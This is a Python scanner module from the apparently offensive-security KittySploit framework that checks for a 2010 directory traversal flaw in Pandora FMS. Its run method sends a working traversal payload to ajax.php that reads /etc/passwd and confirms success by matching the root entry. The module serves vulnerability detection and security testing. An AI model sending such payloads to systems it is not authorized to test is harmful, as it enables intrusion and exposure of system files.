#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in Pandora FMS before 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pandora Fms < 3.1.1 - Directory Traversal Detection',
        'description': 'Multiple directory traversal vulnerabilities in Pandora FMS before 3.1.1 allow remote attackers to include and execute arbitrary local files via (1) the page parameter to ajax.php or (2) the id parameter to general/pandora_help.php, and allow remote attackers to include and execute, create, modify, or delete arbitrary local files via (3) the layout parameter to operation/agentes/networkmap.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'seclists', 'phpshowtime', 'edb', 'lfi', 'joomla', 'artica', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/15643',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-4282',
            'http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/Final%20version%20%28Stable%29/pandorafms_console-3.1_security_patch_13Oct2010.tar.gz/download',
            'http://www.exploit-db.com/exploits/15643',
            'http://seclists.org/fulldisclosure/2010/Nov/326',
        ],
        'cve': 'CVE-2010-4282',
    }

    def run(self):
        r = self.http_request(method="GET", path='/pandora_console/ajax.php?page=../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Pandora Fms < 3.1.1 - Directory Traversal detected",
                path='/pandora_console/ajax.php?page=../../../../../../etc/passwd',
            )
            return True
        return False

